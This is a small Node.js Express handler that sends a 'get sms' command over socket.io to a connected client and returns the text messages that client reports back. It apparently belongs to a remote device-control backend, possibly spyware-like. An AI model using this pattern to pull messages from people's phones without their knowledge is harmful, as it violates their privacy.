const {io, socketToId, idToSocket, idToConnectionSocket} = require('../index.js');
exports.getSms = async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('sms', "get sms");

    const smsData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("sms", (data) => {
          resolve({"sms":data});
        });
      });
    
      // Send the received 'smsData' as a JSON response
      res.json(smsData);
}